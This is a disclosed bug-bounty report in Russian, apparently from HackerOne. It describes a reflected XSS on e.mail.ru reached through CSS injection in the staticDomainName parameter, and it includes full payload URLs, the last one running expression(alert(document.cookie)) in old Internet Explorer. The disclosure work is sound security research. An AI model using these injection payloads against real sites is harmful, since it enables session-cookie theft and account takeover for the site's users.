@@ -1,0 +1,56 @@
+ReportLink:https://hackerone.com/reports/11410
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/4lemon
+ReportedTo:Mail.ru(mailru)
+BountyAmount:400.0
+Severity:
+State:Closed
+DateOfDisclosure:10.12.2014 19:07:13
+
+Summary:
+
+Искал, своими методами, урлы  с возможными уязвимостями. Используя google dork: site:mail.ru inurl:ajax_call, нашёл вот такой:
+https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=14&lang=ru_RU&SpamBallonExp=0&SettingsOn=1&staticDomainName=imgsmail.ru
+
+Сразу привлёк внимание параметр:
+staticDomainName=imgsmail.ru
+Небольшой анализ и перебор параметров показал, что меня name=14 на name=1, получаем картинку в тултипе:
+https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=1&lang=ru_RU&SpamBallonExp=0&SettingsOn=1&staticDomainName=imgsmail.ru
+Меняем домен:
+https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=1&lang=ru_RU&SpamBallonExp=0&SettingsOn=1&staticDomainName=EXAMPLE.COM
+Получаем запрос на изменённый домен.
+GET /mail/ru/images/ico/no_spam.png HTTP/1.1
+Host: img.example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0
+Accept: image/png,image/*;q=0.8,*/*;q=0.5
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=1&lang=ru_RU&SpamBallonExp=0&SettingsOn=1&staticDomainName=EXAMPLE.COM
+Connection: keep-alive
+
+﻿﻿﻿Host: img.example.com - не существует.
+
+Лезем в исходники. Вот куда это попадает:
+<div style="padding-left: 40px;background: url(//img.EXAMPLE.COM/mail/ru/images/ico/no_spam.png) 0 0 no-repeat;zoom:1;">
+
+Быстрые тесты показали, что по простому не получиться (добавляем одинарную и двойную кавычку):
+https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=1&lang=ru_RU&SpamBallonExp=0&SettingsOn=1&staticDomainName=EXAMPLE.COM%27%22
+Исходник (обе кавычки переводяться в HTML сущности):
+<div style="padding-left: 40px;background: url(//img.EXAMPLE.COM&#39;&quot;/mail/ru/images/ico/no_spam.png) 0 0 no-repeat;zoom:1;">
+
+По непонятным мне причинам payload вот такого вида:
+staticDomainName=imgsmail.ru/mail/ru/images/ico/no_spam.png) 0 0 no-repeat;background:url(javascript:alert(1));xxx:url(//img.imgsmail.ru
+
+https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=1&lang=ru_RU&SpamBallonExp=0&SettingsOn=1&staticDomainName=imgsmail.ru/mail/ru/images/ico/no_spam.png%29%200%200%20no-repeat;background:url%28javascript:alert%281%29%29;xxx:url%28//img.imgsmail.ru
+Не сработал в Firefox. 
+Хотя вот такой:
+https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=1&lang=ru_RU&SpamBallonExp=0&SettingsOn=1&staticDomainName=imgsmail.ru/mail/ru/images/ico/no_spam.png%29%200%200%20no-repeat;background:url%28javascript:a;xxx:url%28//img.imgsmail.ru
+
+Показывает в консоли (uncaught exception: ReferenceError: a is not defined), что яваскрипт пытается отработать. Возможно это связано с отсутствием кавычек. Но не стоит забывать про уже почти забытый IE expression в CSS(который приказал долго жить начиная с IE8). В результате вот такой payload:
+https://e.mail.ru/cgi-bin/lstatic?ajax_call=1&x-email=oblaka63%40mail.ru&get=balloon&name=1&lang=&SpamBallonExp=0&SettingsOn=1&staticDomainName=imgsmail.ru/mail/ru/images/ico/no_spam.png)%200%200%20no-repeat;width:%20expression(alert(document.cookie));xxx:url(//img.imgsmail.ru
+
+Отлично сработал на виртуалке с IE6 на WinXP. Что хорошо видно на скриншоте.
+Работает и на авторизованных и на не авторизованных пользователях. Ограничено только версией браузера. Но вопрос почему не сработало в Firefox при этом остаётся открытым (возможно в не самых последних его версиях сработает). 
+Интереса ради проверил google dork: site:mail.ru inurl:staticDomainName
+Там два урла, один уже исследован. Второй нет. Изменение staticDomainName в нём эффекта не производит.
+Таким образом пусть и с ограниченной применимостью, но получаем reflected XSS на домене e.mail.ru
